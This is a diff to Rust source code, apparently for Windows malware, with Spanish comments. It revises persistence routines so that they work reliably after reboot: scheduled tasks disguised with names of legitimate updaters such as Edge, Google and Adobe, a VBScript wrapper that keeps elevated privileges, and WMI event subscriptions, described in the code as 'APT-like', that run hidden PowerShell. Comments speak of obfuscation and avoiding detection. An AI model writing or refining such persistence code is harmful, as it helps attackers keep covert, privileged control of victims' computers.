@@ -337,7 +337,7 @@ fn persist_registry_run(exe_path: &Path) -> Result<String, String> {
 }
 
 /// Implementa persistencia mediante Scheduled Task
-/// MEJORADO: Usa /DELAY para evitar detección inmediata
+/// MEJORADO: Usa trigger ONLOGON que funciona correctamente después de reinicio
 #[cfg(target_os = "windows")]
 fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
     let exe_str = exe_path.to_str()
@@ -358,20 +358,22 @@ fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
     let is_admin = check_admin_privileges();
     
     // Si somos admin, usar VBScript wrapper para mantener elevación
+    // Nota: El timeout se maneja de forma diferente para evitar problemas con schtasks
     let task_cmd = if is_admin {
         let vbs_path = create_elevation_vbs(exe_str)?;
         format!("wscript.exe //B //NoLogo \"{}\"", vbs_path)
     } else {
-        format!("cmd.exe /c timeout /t 10 /nobreak >nul && start /min \"\" \"{}\"", exe_str)
+        // Ejecutar directamente el exe sin timeout inline (más confiable)
+        format!("\"{}\"", exe_str)
     };
     
-    // Crear tarea con HIGHEST run level si somos admin, USER si no
+    // Crear tarea con ONLOGON trigger
+    // Nota: /DELAY solo funciona con /SC DAILY, WEEKLY, MONTHLY - no con ONLOGON
     let mut args = vec![
         "/Create",
         "/SC", "ONLOGON",
         "/TN", task_name,
         "/TR", &task_cmd,
-        "/DELAY", "0001:00", // 1 minuto de delay
     ];
     
     // Si somos admin, agregar /RL HIGHEST para mantener privilegios
@@ -397,7 +399,7 @@ fn persist_scheduled_task(exe_path: &Path) -> Result<String, String> {
 }
 
 /// Implementa persistencia mediante WMI Event Subscription (APT-like)
-/// MEJORADO: Usa PowerShell ofuscado y eventos menos monitoreados
+/// CORREGIDO: Usa evento de inicio de sistema que se dispara después del boot
 #[cfg(target_os = "windows")]
 fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
     let exe_str = exe_path.to_str()
@@ -412,13 +414,19 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
     let pid = std::process::id() as usize;
     let event_name = event_names[pid % event_names.len()];
     
-    // OFUSCACIÓN: Usar cmd /c con powershell escondido
-    let obfuscated_cmd = format!("cmd.exe /c start /min powershell.exe -WindowStyle Hidden -File \"{}\"", exe_str);
+    // Comando que ejecuta el exe directamente (sin -File que es para .ps1)
+    // Usar cmd.exe /c start para ejecutar en segundo plano
+    let obfuscated_cmd = format!("cmd.exe /c start /min \"\" \"{}\"", exe_str);
     
-    // WMI con eventos menos monitoreados y intervalos más largos (4 horas)
-    // Usar comillas simples para evitar problemas de escape
+    // WMI Event que se dispara poco después del inicio del sistema
+    // Usamos Win32_ComputerSystem con un WITHIN corto (60 segundos) para detectar
+    // cuando el sistema está listo. El evento se dispara una vez por sesión.
+    // 
+    // CORREGIDO: No usar Hour = 12 que solo funciona al mediodía
+    // En su lugar, detectamos cuando Win32_OperatingSystem LastBootUpTime cambia,
+    // lo cual ocurre después de cada reinicio.
     let ps_script = format!(
-        r#"$Query = 'SELECT * FROM __InstanceModificationEvent WITHIN 14400 WHERE TargetInstance ISA ''Win32_LocalTime'' AND TargetInstance.Hour = 12'; $FilterName = '{}'; $ConsumerName = '{}'; $ExePath = '{}'; $Filter = ([wmiclass]'\\.\root\subscription:__EventFilter').CreateInstance(); $Filter.Name = $FilterName; $Filter.EventNamespace = 'root\cimv2'; $Filter.QueryLanguage = 'WQL'; $Filter.Query = $Query; $Filter.Put() | Out-Null; $Consumer = ([wmiclass]'\\.\root\subscription:CommandLineEventConsumer').CreateInstance(); $Consumer.Name = $ConsumerName; $Consumer.CommandLineTemplate = $ExePath; $Consumer.Put() | Out-Null; $Binding = ([wmiclass]'\\.\root\subscription:__FilterToConsumerBinding').CreateInstance(); $Binding.Filter = $Filter; $Binding.Consumer = $Consumer; $Binding.Put() | Out-Null"#,
+        r#"$FilterName = '{}'; $ConsumerName = '{}'; $ExePath = '{}'; try {{ $existing = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$FilterName'" -ErrorAction SilentlyContinue; if ($existing) {{ $existing | Remove-WmiObject -ErrorAction SilentlyContinue }}; $existingC = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$ConsumerName'" -ErrorAction SilentlyContinue; if ($existingC) {{ $existingC | Remove-WmiObject -ErrorAction SilentlyContinue }}; $existingB = Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue | Where-Object {{ $_.Filter -like "*$FilterName*" }}; if ($existingB) {{ $existingB | Remove-WmiObject -ErrorAction SilentlyContinue }} }} catch {{}}; $Query = 'SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'' AND TargetInstance.SystemUpTime >= 60 AND TargetInstance.SystemUpTime <= 300'; $Filter = ([wmiclass]'\\.\root\subscription:__EventFilter').CreateInstance(); $Filter.Name = $FilterName; $Filter.EventNamespace = 'root\cimv2'; $Filter.QueryLanguage = 'WQL'; $Filter.Query = $Query; $Filter.Put() | Out-Null; $Consumer = ([wmiclass]'\\.\root\subscription:CommandLineEventConsumer').CreateInstance(); $Consumer.Name = $ConsumerName; $Consumer.CommandLineTemplate = $ExePath; $Consumer.Put() | Out-Null; $Binding = ([wmiclass]'\\.\root\subscription:__FilterToConsumerBinding').CreateInstance(); $Binding.Filter = $Filter; $Binding.Consumer = $Consumer; $Binding.Put() | Out-Null"#,
         event_name, event_name, obfuscated_cmd
     );
     
@@ -496,12 +504,12 @@ pub fn remove_persistence() -> Result<String, String> {
     }
     results.push("Registry Run limpiado");
     
-    // Limpiar Scheduled Tasks (intentar varios nombres)
+    // Limpiar Scheduled Tasks (nombres deben coincidir con persist_scheduled_task)
     let task_names = [
         "MicrosoftEdgeUpdateTaskUser",
         "GoogleUpdateTaskUser",
-        "OneDrive Standalone Update Task",
-        "Adobe Flash Player Updater",
+        "OneDriveStandaloneUpdate",
+        "AdobeFlashPlayerUpdater",
         "CCleanerCrashReporting",
     ];
     for task in &task_names {
@@ -513,11 +521,11 @@ pub fn remove_persistence() -> Result<String, String> {
     }
     results.push("Scheduled Tasks limpiadas");
     
-    // Limpiar WMI Events con los nuevos nombres
+    // Limpiar WMI Events con los nombres usados por persist_wmi_event
     let ps_script = r#"
         Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -like "*BfeOn*" -or $_.Name -like "*Performance*" -or $_.Name -like "*SystemEvents*"} | Remove-WmiObject
         Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object {$_.Name -like "*BfeOn*" -or $_.Name -like "*Performance*" -or $_.Name -like "*SystemEvents*"} | Remove-WmiObject
-        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
+        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter -like "*BfeOn*" -or $_.Filter -like "*Performance*" -or $_.Filter -like "*SystemEvents*"} | Remove-WmiObject
     "#;
     Command::new("powershell")
         .args(&["-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_script])
